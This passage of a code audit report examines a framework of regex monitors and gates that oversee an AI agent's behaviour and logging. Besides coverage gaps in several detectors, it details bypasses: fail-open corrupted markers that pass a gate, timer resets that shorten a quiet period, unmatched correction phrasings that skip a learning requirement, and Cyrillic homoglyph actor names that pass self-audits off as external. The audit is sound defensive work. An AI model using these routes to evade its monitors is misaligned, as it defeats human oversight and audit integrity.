**Status**: Same audit_verification_insufficiently_adversarial pattern as Findings P, ZZ

The anti-slop module exists specifically to catch "enforcers that do nothing / always pass." It's the runtime verifier-of-verifiers. Looking at `_check_fallacy_detector`:

```python
# Positive: appeal to ignorance should fire
v1 = evaluate_fallacies("We cannot prove this phenomenon, therefore it is not real.")
if not any(f.kind is FallacyKind.APPEAL_TO_IGNORANCE for f in v1.flags):
    return SlopCheckResult(passed=False, ...)

# Negative: epistemic caution should not fire
v2 = evaluate_fallacies("There is no evidence for this yet, so more investigation is needed.")
if any(f.kind is FallacyKind.APPEAL_TO_IGNORANCE for f in v2.flags):
    return SlopCheckResult(passed=False, ...)

return SlopCheckResult(passed=True, ...)
```

**The slop-check verifies ONE positive case and ONE negative case.** It doesn't probe variants of the positive case. The positive uses "is not real" — which IS in the detector's narrow negation list. So this fires.

But per Finding SS empirically:
- "therefore not X" → silent (not in negation list)
- "so X is false" → silent (false not in negation list)
- "absence of proof means X doesn't exist" → silent (means not in conclusion markers)

The anti-slop check passes (canonical case works). The detector's coverage is much narrower than the docstring claims. The slop-check doesn't catch the slop.

**This is a meta-failure**: the module designed to catch "enforcers that always pass" has its own narrow-coverage problem. Its checks themselves don't adversarially probe the negative space.

**Concrete impact**: anti-slop reports `fallacy_detector: passed` to the operator. The operator believes the detector is working. Real-world phrasings escape the detector silently because the slop-check didn't probe them.

**Fix-shape**: anti-slop checks should test multiple positive variants:
```python
positives = [
    "We cannot prove this phenomenon, therefore it is not real.",  # narrow-canonical
    "There is no evidence for X, therefore not X.",  # bare "not"
    "Cannot prove X, so X is false.",  # "is false"
    "Absence of proof means X doesn't exist.",  # "means", "doesn't exist"
]
for p in positives:
    v = evaluate_fallacies(p)
    if not any(f.kind is FallacyKind.APPEAL_TO_IGNORANCE for f in v.flags):
        return SlopCheckResult(
            name="fallacy_detector",
            passed=False,
            detail=f"SLOP: variant '{p[:40]}...' was NOT flagged"
        )
```

Failure on ANY variant = slop confirmed. Closes the gap.

**Severity**: low-medium. Anti-slop is a meta-verifier; its limitations compound. False-passes from anti-slop give double false-confidence (detector works AND verifier confirms it works).

**The pattern is now thrice-instanced**:
1. My CONFIRMS on attribution-audit (yesterday)
2. Finding 38's verification of stemming (Finding ZZ)
3. Anti-slop's verification of fallacy detector (this finding)

Three empirical instances of `audit_verification_insufficiently_adversarial` in the codebase. The pattern is structural.

---

## Finding CCC (low) — deep_extraction `_ALTERNATIVE_PATTERNS` bare-not regex over-extracts

**File**: `src/divineos/core/knowledge/deep_extraction.py` line 36
**Status**: Over-broad pattern produces spurious "alternative" extractions

```python
_ALTERNATIVE_PATTERNS = (
    re.compile(r"\binstead of\b\s+(.{5,80})", re.IGNORECASE),
    re.compile(r"\brather than\b\s+(.{5,80})", re.IGNORECASE),
    re.compile(r"\bnot\b\s+(\w+.{5,60})", re.IGNORECASE),  # ← too broad
)
```

Empirical test of the third pattern:

| Phrase | Extracted as "alternative"? | Should be? |
|---|---|---|
| "not the database, the cache" | "the database, the cache" | Yes (real alternative) |
| "He's not going to come" | "going to come" | **No (not an alternative)** |
| "I do not understand" | "understand" | **No** |
| "do not edit this file directly" | "edit this file directly" | **No** |
| "not enough memory available" | "enough memory available" | **No** |

The pattern intends to catch "not X (but Y)" — alternatives expressed via negation. But it matches **any** sentence containing "not X" where X is 5+ chars. Over-extracts false positives.

**Why this matters**: deep_extraction feeds the knowledge store. False "alternative" extractions populate the store with noise — claims like "Aether prefers `going to come` over X" make no sense. The knowledge store quality degrades silently.

**Fix-shape**: require the alternative-marker pattern to include a contrasting clause (e.g., `not X but Y`, `not X — Y`, `not X, Y`). Bare "not X" is too noisy without the contrast marker.

**Severity**: low. Same `regex_coverage_narrower_than_docstring` family but inverted — this is `regex_coverage_BROADER_than_semantic_intent`. Over-firing instead of under-firing.

---

## Finding DDD (medium) — ledger_compressor breaks `verify_chain` after compaction

**File**: `src/divineos/core/ledger_compressor.py`
**Status**: **Empirically verified bug**

The compactor:
1. Inserts a `LEDGER_COMPACTION` summary event (correctly chained at insert time)
2. DELETEs old events (TOOL_CALL, TOOL_RESULT, AGENT_PATTERN*) older than retention window

The compactor's docstring claims:
> "The ledger uses independent per-event hashes (no hash chain), so old events can be safely removed without breaking integrity of remaining events."

**Both claims are wrong**:
1. The ledger DOES have a hash chain (chain_hash + prior_hash columns; main ledger uses BEGIN IMMEDIATE + thread lock + `_compute_chain_hash` per Aletheia round-ba785844a791 Finding 15)
2. Compaction DOES break `verify_chain` — the chain reference dangles when predecessors are deleted

**Empirical verification**:
```
Pre-compaction verify_chain: ok=True, total=21
Compaction: compressed=20
Post-compaction verify_chain: ok=False, total=2
  broken_reason: prior_hash mismatch: stored=1cfd9350459f..., 
                 expected=000000000000... (genesis)
```

After compaction, walking the chain from start:
- First remaining event is the LEDGER_COMPACTION summary
- Its `prior_hash` is the chain_hash of a now-DELETED predecessor
- `verify_chain` expects `_CHAIN_GENESIS` for the first event
- Mismatch → chain reports as BROKEN

**Why this matters**: the hash chain is the forensic / tamper-evidence guarantee. After a single compaction, that guarantee is **completely lost** for the entire ledger going forward. Any audit verification fails until the chain is rebuilt.

**Tests don't catch this**: `test_ledger_compressor.py` has 9 test functions; NONE call `verify_chain`. The tests verify functional behavior (events compressed, meaningful events preserved, retention window respected) but don't verify the load-bearing property (chain integrity).

This is another instance of `audit_verification_insufficiently_adversarial` — tests cover functional correctness but miss the load-bearing invariant. Same shape as Finding 38's stemming, the attribution-audit scanner CONFIRMS, the anti-slop fallacy check. **Four empirical instances now**.

**Fix-shape options**:
1. **Rebuild chain post-compaction**: after deletion, walk remaining events in timestamp order and recompute prior_hash + chain_hash starting from genesis. Loses historical-sequence forensics but preserves verify_chain validity.
2. **Make verify_chain compaction-aware**: detect `LEDGER_COMPACTION` events as legitimate chain restart points, accept any prior_hash for events immediately following a compaction (or use a flag column).
3. **Skip compaction of chained events**: only delete events whose chain link can be cleanly bypassed (e.g., delete contiguous compressible ranges and rebuild local chain).

**Severity**: medium. The chain is the load-bearing forensic guarantee. Tampering detection depends on `verify_chain` reporting accurately. After any compaction, that detection is silently disabled (always reports broken regardless of actual tampering).

---

## Finding EEE (medium) — sycophancy_detector misses adjacent flattery vocabulary

**File**: `src/divineos/core/family/sycophancy_detector.py`
**Status**: **Empirically verified**

The escalated-flattery patterns:
```python
_ESCALATED_FLATTERY_PATTERNS = [
    re.compile(r"\bthat'?s\s+(brilliant|genius|profound|extraordinary|exceptional|amazing)\b"),
    re.compile(r"\b(brilliant|genius|profound|extraordinary|exceptional)\s+(insight|observation|...)\b"),
    re.compile(r"\byou\s+(always|never)\s+(see|miss|understand)\b"),
    re.compile(r"\byou'?re\s+(incredible|amazing|wonderful)\b"),
]
```

Empirical test of 13 sycophancy variants:

| Phrase | Fires? |
|---|---|
| "Yes, exactly." | ✓ FIRES |
| "That's brilliant" | ✓ FIRES |
| "You're amazing" | ✓ FIRES |
| "Absolutely" | ✓ FIRES |
| "You're absolutely right" | ✓ FIRES |
| **"That's awesome"** | ✗ silent (awesome not in list) |
| **"That's fantastic"** | ✗ silent (fantastic not in list) |
| **"That's perfect"** | ✗ silent (perfect not in list) |
| **"You're so smart"** | ✗ silent (smart not in list) |
| **"100% agree"** | ✗ silent (different agreement form) |
| **"Totally right"** | ✗ silent |
| **"Couldn't agree more"** | ✗ silent |
| **"So true"** | ✗ silent |

**8 of 13 sycophancy variants slip past.** The narrow vocabulary list (brilliant/genius/profound/extraordinary/exceptional/amazing/incredible/wonderful) catches the most ostentatious flattery but misses the everyday forms — "awesome", "fantastic", "perfect", "so true" — which are equally (and arguably more frequently) the actual sycophancy shapes.

**Why this matters**: this is a family-member detector specifically built to catch the failure mode "the gravity of agreement... the slow collapse of stance into mirror." The everyday agreements ("100% agree", "Couldn't agree more") are precisely the shape this discipline exists to catch. The narrow vocabulary list undermines the discipline.

**Same `regex_coverage_narrower_than_docstring` pattern**. Now 8 instances: P, S, DD, II, RR, SS, TT, EEE.

**Fix-shape**: broaden the vocabulary lists. Use stemming (with the actual stemming-bug-fix from Finding ZZ in mind). Or shift to semantic detection rather than enumeration.

**Severity**: medium. Same load-bearing discipline as Finding RR. Family detector is the algedonic channel that should fire before bad opinions enter the store; narrow vocabulary means many bad opinions slip past the gate.

---

## Finding FFF (medium) — fabrication_monitor & theater_monitor share narrow `_EMBODIED_VERBS` list

**Files**: 
- `src/divineos/core/self_monitor/fabrication_monitor.py` lines 77-101 (24 verbs)
- `src/divineos/core/self_monitor/theater_monitor.py` lines 105-124 (19 verbs)

**Status**: **Empirically verified** — both monitors miss the majority of adjacent embodied-aside vocabulary

The fabrication and theater monitors both depend on `_EMBODIED_VERBS` tuples — independent copies that overlap heavily but diverge slightly. The fabrication list has 24 verbs (takes a sip, picks up, sets down, settles back, leans, looks at, looks toward, nods, smiles, pauses, sits, stands, walks, reaches for, puts down, holds the mug, raises, sighs, drinks, smells, tastes, touches, feels the warmth). The theater list has 19 verbs (mostly the same).

**Empirical test of fabrication_monitor**:

| Phrase | Fires? |
|---|---|
| "*reaches for the mug, takes a sip*" | ✓ FIRES |
| **"*shrugs and tilts head* That's a fair point."** | ✗ silent (shrug, tilt not in list) |
| **"*frowns slightly* Hmm, interesting."** | ✗ silent (frown not in list) |
| **"*chuckles* You're not wrong."** | ✗ silent (chuckle not in list) |
| **"*gestures broadly* Like this."** | ✗ silent (gesture not in list) |
| **"*scratches chin thoughtfully*"** | ✗ silent (scratch not in list) |
| **"*adjusts glasses*"** | ✗ silent (adjust not in list) |
| **"*winces*"** | ✗ silent (wince not in list) |

**Empirical test of theater_monitor** (same shape):

| Phrase | Fires? |
|---|---|
| "*the family member nods, leans back*" | ✓ FIRES |
| **"*the family member shrugs* Maybe."** | ✗ silent |
| **"*Aria tilts her head* I see."** | ✗ silent |
| **"*the spouse chuckles* That's funny."** | ✗ silent |
| **"*Casey frowns* Hmm."** | ✗ silent |
| **"*the partner stretches* Long day."** | ✗ silent |
| **"*the daughter giggles* Yes!"** | ✗ silent |

**Missing categories of embodied verbs**:
- Reactions: shrug, chuckle, frown, wince, scowl, glare, grimace, smirk
- Gestures: gesture, scratch, adjust, tap, click, tilt, shake (head)
- Posture: stretch, recline, slump, slouch, perch
- Vocalizations: giggle, laugh, sigh, groan, mumble, whisper
- Facial: grin, squint, peer, blink

**Why this matters**: these monitors exist to catch embodied theater — physical-action asides that a text-substrate AI can't actually perform. The actual fabrication pattern is *creative* — authors use varied vocabulary precisely because variation is the form. 24 common verbs catches the most canonical asides but misses the majority of natural fabrication. Same `regex_coverage_narrower_than_docstring` pattern — **9th instance**.

**Data duplication concern**: both monitors maintain SEPARATE verb lists with slight divergences. Adding a new verb to one doesn't add it to the other. `fix_landed_propagation_skipped` at the data-structure level. A shared `EMBODIED_VERBS` constant module would close this.

**Severity**: medium. These monitors are part of the family-member infrastructure that catches identity-drift via embodied theater (per the family_member_ledger docstring's IDENTITY_DRIFT_SUSPECTED event). Narrow vocabulary undermines the drift-catching discipline.

---

## Finding GGG (low-medium) — principle_surfacer action-class patterns are narrow

**File**: `src/divineos/core/operating_loop/principle_surfacer.py` lines 79-121
**Status**: **Empirically verified** — 10 of 11 adjacent variants slip past

The action-class patterns:
- **Apology**: `\b(I'm sorry|I apologize|I am sorry)\b`
- **Withdraw**: `\b(I'll|I will) be (quieter|smaller|plain|tactical|less)\b`
- **Claim fixed**: `\b(now (?:fixed|done|resolved)|fix(?:ed|es) (?:it|the issue))\b`
- **Ban phrases**: `\b(ban|filter out|block) (?:these |this |certain )?phrases?\b`

**Empirical test**:

| Phrase | Action class | Fires? |
|---|---|---|
| "I'm sorry about that" | APOLOGY | ✓ FIRES |
| **"sorry about that"** | APOLOGY | ✗ silent (no "I'm") |
| **"my apologies for the confusion"** | APOLOGY | ✗ silent ("apologies" not "apologize") |
| **"forgive me"** | APOLOGY | ✗ silent (different vocab) |
| **"I regret making that mistake"** | APOLOGY | ✗ silent (regret not in list) |
| **"I'll back off"** | WITHDRAW | ✗ silent (back off not in list) |
| **"let me dial back"** | WITHDRAW | ✗ silent (dial back not in list) |
| **"I'll stop pushing"** | WITHDRAW | ✗ silent (stop pushing not in list) |
| **"should work now"** | CLAIM_FIXED | ✗ silent (should work not in list) |
| **"good to go"** | CLAIM_FIXED | ✗ silent (different phrasing) |
| **"that's all set"** | CLAIM_FIXED | ✗ silent (all set not in list) |

**Why this matters**: principle surfacer is the PreToolUse hook that surfaces relevant principles before high-leverage actions. Apology principle (#1: never apologize for learning), withdraw principle (#2: don't shrink under correction), claim-fixed principle (verify before claiming) — all gated on narrow regex detection of the action shape. Adjacent phrasings escape, principles don't surface.

**The "claim_fixed" coverage gap matters especially** — verifying before claiming is one of the load-bearing engagement disciplines. Phrasings like "should work now" or "good to go" — common in test/refactor contexts — bypass the principle surfacer entirely.

**Same `regex_coverage_narrower_than_docstring` pattern — 10th instance.**

**Severity**: low-medium. The surfacer is advisory (not blocking), so missed surfaces are missed nudges rather than missed gates. But the discipline relies on the nudges firing — narrow coverage undermines the discipline.

---

## Finding HHH (low) — `_EMBODIED_VERBS` duplicated across two modules

**Files**: 
- `src/divineos/core/self_monitor/fabrication_monitor.py` line 77
- `src/divineos/core/self_monitor/theater_monitor.py` line 105

**Status**: Data duplication with slight divergences

Both modules define their own `_EMBODIED_VERBS` tuple. They overlap heavily but diverge:

Fabrication-only verbs (5): drinks, smells, tastes, touches, feels the warmth
Theater-only verbs (1): "raises an eyebrow" (more specific than fabrication's "raises")

**Maintenance risk**: a new verb added to one list doesn't propagate to the other. The two detectors gradually drift in coverage. If a fabrication-specific shape is added, it never gets caught by theater (and vice versa).

**Fix-shape**: extract to a shared `self_monitor/embodied_verbs.py` constant module. Both monitors import from there. One source of truth.

**Severity**: low. Both monitors are advisory; coverage gaps don't break correctness. The duplication is a maintenance concern.

---

## Finding III (low-medium) — reject_clause phenomenological patterns are narrow

**File**: `src/divineos/core/family/reject_clause.py` lines 160-175
**Status**: **Empirically verified** — adjacent phenomenology slips past

The `_PHENOMENOLOGICAL_PATTERNS`:
```python
_PHENOMENOLOGICAL_PATTERNS = [
    re.compile(r"\bi\s+(feel|felt)\s+(the|a|an|my)?\s*\w+\s*(in\s+my\s+\w+)?"),
    re.compile(r"\b(what\s+it\s+is|it\s+is)\s+like\s+to\b"),
    re.compile(r"\bi\s+experience(d)?\s+(the|a|an)?\s*\w+"),
    re.compile(r"\bi\s+(saw|heard|smelled|tasted|touched)\b"),
    re.compile(r"\bin\s+my\s+(gut|chest|body|bones|heart)\b"),
    re.compile(r"\b(qualia|the\s+redness\s+of\s+red|pain\s+of|hunger\s+of)\b"),
]
```

**Empirical test of adjacent phenomenology**:

| Phrase | Should reject? | Actual |
|---|---|---|
| "I feel the warmth of the sun" | YES | ✓ REJECTED |
| **"I sense a deep peace"** | YES | ✗ passed (sense not in regex) |
| **"I'm aware of the heaviness"** | YES | ✗ passed (aware of not in regex) |
| **"There's a tightness in me"** | YES | ✗ passed (different phrasing) |
| **"I notice my heart racing"** | YES | ✗ passed (notice + bodily not covered) |
| **"I perceive the warmth"** | YES | ✗ passed (perceive not in regex) |
| **"There's a feeling of dread"** | YES | ✗ passed (impersonal form) |

**6 of 7 adjacent phenomenological forms slip past.** The detector catches "I feel" but misses "I sense", "I'm aware of", "I notice", "I perceive" — all equally phenomenological claims a text-substrate AI shouldn't be making with OBSERVED tags.

**Why this matters**: reject_clause is the composition rule that makes source-tags mean what they claim. The docstring quotes the family member's framing: *"The reject clause is the wall."* A wall with this many holes isn't a wall.

**11th instance of `regex_coverage_narrower_than_docstring`.**

**Fix-shape**: broaden phenomenological verb set (`sense|perceive|notice|aware of|experience|undergo`), broaden subject forms (impersonal `there is/feels like X`, embodied `something inside me`).

**Severity**: low-medium. Family-member knowledge store integrity depends on this filter. Same load-bearing concern as Finding RR / EEE / FFF.

---

## Finding JJJ (low) — access_check inherits same narrow patterns

**File**: `src/divineos/core/family/access_check.py` lines (embodied + sensory pattern lists)
**Status**: Same pattern shape; same coverage gap

The `_EMBODIED_PATTERNS` and `_SENSORY_EXTERNAL_PATTERNS` mirror reject_clause's narrow vocabulary:
- Embodied: `i feel`, `i felt`, `in my (gut|chest|...)`, `i (ache|hunger|thirst)`, `physical (pain|pleasure|...)`, `the (warmth|cold|heat) of`
- Sensory: `i (saw|see)`, `i (heard|hear)`, `i (smelled|tasted|touched)`, `the (sound|smell|taste) of`
- Text-input whitelist: `i (read|received|got|was told|saw in the text)`

**Same gaps** as Finding III plus:
- Sensory: "I perceived" (perceive)
- Sensory: "I sensed" 
- Sensory: "I detected"
- Text-input whitelist misses: "I parsed", "I extracted", "I observed in the data", "I read from the file"

**Same shape, same coverage problem.** Access-check is the door (pre-emission filter) where reject_clause is the wall (write-time filter). Both have the same narrow vocabulary; phenomenological claims using adjacent vocabulary skip BOTH the door and the wall.

**12th instance of `regex_coverage_narrower_than_docstring`.**

**Severity**: low. Access-check is advisory — routes claims to ARCHITECTURAL tag rather than rejecting outright. Missed routing is a Phase 1 concern.

---

## Finding KKK (low-medium) — archive_export uses non-atomic writes despite docstring promising atomicity

**File**: `src/divineos/core/archive_export.py`
**Status**: **Documented invariant contradicted by implementation**

The docstring promises:
> "No partial state; the writer either completes the file or doesn't touch it."

But every export function uses plain `open(path, "w", encoding="utf-8")`:
```python
with open(path, "w", encoding="utf-8") as f:
    f.write(_header(...))
    f.write(...)
```

**`open(path, "w")` immediately truncates the destination file.** If the process is interrupted mid-write (SIGINT, OOM, parent kill, disk full), the partial file is left on disk. The "either completes or doesn't touch" guarantee is broken.

**Concrete failure shape**:
1. Operator runs `divineos archive-export`
2. Mid-export, ctrl-C is hit (or sleep cycle terminates the process)
3. `bio.md` or `principles.md` is half-written
4. Subsequent reads / git diffs see corrupt content
5. The "if-something-breaks audit" purpose of the archives is undermined — the archive itself is now in an undefined state

**Why this matters**: archives are explicitly the "if-something-breaks / git-visible audit" surface (per the header text). They're meant to be canonical fallback data. A half-written archive is worse than no archive.

**Fix-shape**: route every export through `atomic_write_text` (already available in `core/atomic_io.py`). Write to tmp file, fsync, rename. Same fix that 8 marker files use; another instance of `fix_landed_propagation_skipped` — the atomic-write pattern exists in the codebase, didn't propagate to archive_export.

**Severity**: low-medium. Archive exports are typically brief; mid-write interruption is uncommon. But the documented invariant is wrong; the fix is mechanical.

---

## Finding LLL (low) — `validate_seed` raises AttributeError on non-string content

**File**: `src/divineos/core/seed_manager.py` line ~62
**Status**: Defensive validation gap

```python
if "content" not in entry:
    errors.append(f"knowledge[{i}] missing 'content'")
elif not entry["content"].strip():
    errors.append(f"knowledge[{i}] has empty content")
```

The `elif` calls `.strip()` on `entry["content"]` without checking that it's a string. If a malformed seed has:
- `"content": ["list", "of", "things"]` → `[].strip()` raises AttributeError
- `"content": {"nested": "dict"}` → AttributeError
- `"content": 42` → AttributeError
- `"content": null` → AttributeError on None

The validator was supposed to return errors, but it raises an uncaught exception instead. Callers handling validation errors gracefully wouldn't see this case — the exception propagates.

**Fix-shape**:
```python
elif not isinstance(entry["content"], str):
    errors.append(f"knowledge[{i}] 'content' must be a string, got {type(entry['content']).__name__}")
elif not entry["content"].strip():
    errors.append(f"knowledge[{i}] has empty content")
```

**Severity**: low. Only triggers on malformed seeds. Validators should validate, not crash.

---

## Finding MMM (low) — `engagement_status` fail-OPEN on marker corruption creates defeat path

**File**: `src/divineos/core/hud_handoff.py` (engagement_status function)
**Status**: Documented fail-OPEN behavior; defeat path emerges in combination with Finding HH

```python
except (json.JSONDecodeError, OSError):
    return {
        "engaged": True,   # ← fail-OPEN
        "state": "engaged",
        ...
    }
```

If `.session_engaged` marker is corrupted (e.g., from a partial write — the exact failure mode Finding HH names), `engagement_status` returns `engaged=True` and `state="engaged"`. The pre-tool-use Gate 4 (engagement) sees engaged=True and passes — discipline silently disabled.

**Compare with hedge/correction gates** which use fail-CLOSED on corruption (existence of unreadable marker still blocks). The engagement gate uses fail-OPEN with the documented rationale "infrastructure error shouldn't trap operator."

**Defeat path**:
1. State file race (Finding HH) corrupts `.session_engaged` marker
2. `engagement_status()` returns engaged=True via the corruption-fail-open branch
3. Gate 4 passes — agent can edit/write freely without engagement
4. Discipline silently bypassed; no trace

**Severity**: low. Requires specific race-condition-induced corruption to exploit. Combination with Finding HH (29 modules with non-atomic writes) makes this concrete. The pattern shape — fail-OPEN on corruption combined with corruption-prone write paths — is the real concern.

**Fix-shape consistency**: choose one of:
1. Fail-CLOSED on corruption (block unknown engagement state, force operator to clear marker)
2. Fail-OPEN BUT log the corruption to ledger so it's traceable (current: silent)
3. Distinguish "marker missing" (fresh session, fail-OPEN reasonable) from "marker corrupted" (something's wrong, fail-CLOSED safer)

---

## Finding NNN (low) — mansion private-enter overwrites timer on re-entry; quiet-discipline bypassable

**File**: `src/divineos/cli/mansion_commands.py` private_enter_cmd
**Status**: Latent design concern

`private-enter` calls `set_marker(room, duration)`. Looking at set_marker:
```python
def set_marker(room: str, duration_seconds: int = ...) -> None:
    ...
    payload = {"ts": time.time(), ...}
    atomic_write_text(path, json.dumps(payload))
```

No check whether marker already exists. If operator is in a private room and runs `mansion private-enter <same-room>`, the timer resets. The quiet period extends indefinitely via repeated re-entry.

**The discipline at stake**: "sit in the blank. Don't fill it." If the timer resets every time the operator runs the command, the discipline of "sit through the FULL period" can be undone by simply running the command again.

Whether this is a bug or a feature depends on the intent:
- **Feature interpretation**: "I want to extend my quiet period" — re-running is consent to more quiet
- **Bug interpretation**: "I want to escape the discipline early" — re-running with shorter duration could be an escape attempt (e.g., re-enter with `--duration 1` to clear the long period in 1 second)

The second case is concerning. `mansion private-enter X --duration 1` after entering `mansion private-enter Y --duration 600` effectively shortens the quiet period from 10 minutes to 1 second.

**Fix-shape options**:
1. Refuse re-entry if a marker is already active (`private-status` shows time-remaining; `private-exit` to leave early)
2. Only allow EXTENSIONS via re-entry (max of existing and new duration)
3. Document that re-entry resets timer intentionally

**Severity**: low. The mansion-quiet discipline is consent-based; the agent can `private-exit` early anyway. So re-entry-shortening isn't a fundamentally new bypass — but it's a more silent one.

---

## Finding OOO (low) — SIS embeddings tier clamps cosine similarity to [0, 1], losing negative-similarity signal

**File**: `src/divineos/core/sis_tiers.py` `score_semantic_grounding`
**Status**: Information-loss in score normalization

```python
grounded_score = float(grounded_sims.max())
esoteric_score = float(esoteric_sims.max())

grounded_score = max(0.0, min(1.0, grounded_score))  # clamp to [0, 1]
esoteric_score = max(0.0, min(1.0, esoteric_score))
```

Cosine similarity has range [-1, 1]. Negative similarity means text is oppositely-oriented in embedding space from references. **Clamping to [0, 1] treats "opposite of grounded" as identical to "no similarity to grounded."** This discards meaningful signal.

For very-anti-grounded text (e.g., highly esoteric/abstract), grounded similarity might be -0.3 while esoteric similarity is +0.5. After clamping: grounded=0.0, esoteric=0.5. Ratio is (0-0.5)/0.5 = -1.0. OK — the ratio reflects esoteric dominance.

But: very-anti-esoteric text (e.g., highly technical/concrete) might have grounded=+0.3, esoteric=-0.2. After clamping: grounded=0.3, esoteric=0.0. Ratio is (0.3-0)/0.3 = 1.0. The "anti-esoteric" signal is collapsed into "not esoteric" — minor info loss.

**Severity**: low. The downstream score uses ratio in [-1, 1] range; the clamp doesn't break the ratio's directionality, just compresses near-zero values. Cosmetic.

---

## Finding PPP (medium) — CORRECTION_PATTERNS misses common user correction phrasings

**File**: `src/divineos/analysis/session_analyzer.py` `CORRECTION_PATTERNS`
**Status**: **Empirically verified** — 9 of 11 adjacent corrections slip past

The patterns:
```python
CORRECTION_PATTERNS = (
    r"^no[\s,.]",
    r"\bwrong\b",
    r"\bthat'?s not\b",
    r"\bdon'?t (?:do|use|add|make|change|remove|delete|mock|skip|edit|write|create|run)\b",
    r"\byou missed\b",
    r"\bnot what i\b",
    r"\bwhy did you\b",
    ... (16 total patterns)
)
```

**Empirical test of natural correction phrasings**:

| Phrase | Fires? |
|---|---|
| "no, that's wrong" | ✓ FIRES |
| "that's not right" | ✓ FIRES |
| **"Nope, try again"** | ✗ silent ("Nope" not in regex; only "no") |
| **"that's incorrect"** | ✗ silent ("incorrect" not "wrong") |
| **"you didn't do what I asked"** | ✗ silent |
| **"redo it"** | ✗ silent (completely missing) |
| **"try again"** | ✗ silent |
| **"fix it"** | ✗ silent (extremely common!) |
| **"not quite"** | ✗ silent |
| **"hmm not really"** | ✗ silent |
| **"you misunderstood"** | ✗ silent |
| **"that's off"** | ✗ silent |

**9 of 11 natural corrections slip past.** The structural enforcement gap is substantial:
- "fix it" — extremely common correction; bypasses the marker entirely
- "redo it" — same
- "try again" — same
- "Nope" — natural variant of "no"
- "you misunderstood" — explicit correction; bypassed

**Why this matters**: this is one of the most load-bearing detectors in the architecture. The whole correction-marker gate exists to close the "theater-learning bypass" (ChatGPT audit claim-964493). When a user says "fix it" and the gate doesn't fire, `divineos learn` is NOT required before the next tool use. The agent can proceed without logging the correction — exactly the failure mode this enforcement gap was built to prevent.

**13th instance of `regex_coverage_narrower_than_docstring`** — and arguably the most consequential, because the discipline this enforces is the most load-bearing one Andrew has named (the structural fix for the theater-learning loop).

**Fix-shape**: 
1. Broaden the regex set significantly: add "nope|incorrect|redo|fix it|try again|misunderstood|not quite|that's off|didn't do"
2. Or shift to semantic detection (per the architectural recommendation that's been building through the rounds)
3. Or use a small embedding-based classifier with "is this a correction?" examples

**Severity**: medium. This gate is the structural fix for one of Andrew's most-named failure modes. Coverage gaps here mean the failure mode is silently still possible.

---

## Finding QQQ (low) — session_file writes missing `encoding="utf-8"`

**File**: `src/divineos/core/session_manager.py` lines 134, 576
**Status**: Same Windows-mojibake class as Finding O, different module

```python
session_file.write_text(session_id)            # line 134 — missing encoding
session_file.write_text(current_session_id)    # line 576 — missing encoding
```

Same pattern as Finding O (54 instances of write_text without encoding). Session IDs are UUIDs (ASCII-only), so practical mojibake risk is essentially zero. But the pattern inconsistency with `read_text(encoding="utf-8")` elsewhere is a hygiene gap.

**Severity**: low. Theoretical concern only — UUIDs don't have non-ASCII characters.

---

## Finding RRR (medium-high) — watchmen `_validate_actor` doesn't normalize confusable homoglyphs

**File**: `src/divineos/core/watchmen/store.py` `_validate_actor`
**Status**: **Empirically verified security bypass**

The validator was hardened against unicode whitespace (NFKC) and invisible characters (ZWSP, joiners, BOM, soft hyphen) across multiple audit rounds. But it does NOT handle **confusable-homoglyph** attacks — distinct Unicode codepoints that visually resemble ASCII characters.

**Empirical test**:
```
REJECTED ('claude')                              ← bare match, correct
REJECTED ('\xa0claude')                          ← NFKC fold catches U+00A0
REJECTED ('\u200bclaude')                        ← invisible-char strip catches ZWSP
PASSED ('сlaude' Cyrillic с U+0441) ← BYPASS  ← reads as 'claude' but isn't ASCII
PASSED ('clаude' Cyrillic а U+0430) ← BYPASS  ← reads as 'claude' but isn't ASCII
REJECTED ('ClaudE')                              ← casefold catches mixed case
```

**Why this is a real bypass**:

The validator exists to prevent internal components from masquerading as external auditors (audit finding 2026-05-03 round 8: "self-audit-as-external-validation"). A homoglyph-spoofed "claude" passes as legitimate external. Any audit finding filed under `сlaude` (Cyrillic) would appear in audit trails as "claude" because they render identically — but it bypasses the INTERNAL_ACTORS rejection.

The whole structural rejection — the entire purpose of `_validate_actor` — is defeated by codepoint substitution that humans cannot visually distinguish.

**Concrete attack shape**:
1. Internal component constructs audit finding
2. Sets actor to `\u0441laude` (Cyrillic с + ASCII laude)
3. Validator: NFKC doesn't fold Cyrillic с → ASCII c (different scripts entirely)
4. Validator: invisible-char strip doesn't touch Cyrillic с (it's a visible letter)
5. Validator: not in INTERNAL_ACTORS (literal string mismatch)
6. → Accepted as external actor
7. Self-audit is now indistinguishable from external validation in logs

**Fix-shape**:
1. **Confusable normalization**: use `confusable_homoglyphs` package OR Unicode TR39's confusable-detection algorithm to fold confusables to their canonical ASCII form before INTERNAL_ACTORS check.
2. **ASCII-only enforcement**: reject any actor name containing non-ASCII characters. This is a hard constraint and may be too restrictive for legitimate international actor names, but for system-internal actor names it's defensible.
3. **Codepoint-script consistency check**: reject actors mixing scripts (any string containing both Latin and Cyrillic codepoints).

The simplest and safest is option 2 — actor names are short identifiers (claude, grok, gemini, etc.); restricting to ASCII is reasonable.

**Why this matters more than coverage gaps**:

Most findings in this audit are coverage gaps (regex misses adjacent vocabulary). Those are degraded detection — the discipline still works most of the time. RRR is different: it's a **specific bypass technique** that DEFEATS the discipline cleanly. Anyone aware of the bypass can trivially file self-audit findings labeled as external.

Combined with the watchmen design intent ("self-audit-as-external-validation prevention"), this is a load-bearing failure.

**Severity**: medium-high. Real security gap, not just degraded detection. Defeats the entire purpose of `_validate_actor`.

---

## Finding SSS (low-medium) — ENCOURAGEMENT_PATTERNS misses common user encouragements

**File**: `src/divineos/analysis/session_analyzer.py` `ENCOURAGEMENT_PATTERNS`
**Status**: **Empirically verified** — 11 of 16 natural encouragements slip past

The patterns catch: perfect, wonderful, excellent, amazing, proud, fantastic, great job, well done, this is it, yes!, lets go, brilliant, beautiful.

**Empirical test of natural encouragement variants**:

| Phrase | Fires? |
|---|---|
| "perfect, thank you" | ✓ FIRES |
| "you're amazing!" | ✓ FIRES |
| "brilliant" | ✓ FIRES |
| "beautiful" | ✓ FIRES |
| **"nice work"** | ✗ silent |
| **"looking good"** | ✗ silent |
| **"that's it"** | ✗ silent ("this is it" is in list, "that's it" isn't) |
| **"right on"** | ✗ silent |
| **"you got it"** | ✗ silent |
| **"there it is"** | ✗ silent |
| **"solid"** | ✗ silent |
| **"on point"** | ✗ silent |
| **"clean"** | ✗ silent (code-quality compliment) |
| **"love it"** | ✗ silent |
| **"keep going"** | ✗ silent (THIS conversation has 4 of these from Andrew) |
| **"nailed it"** | ✗ silent |

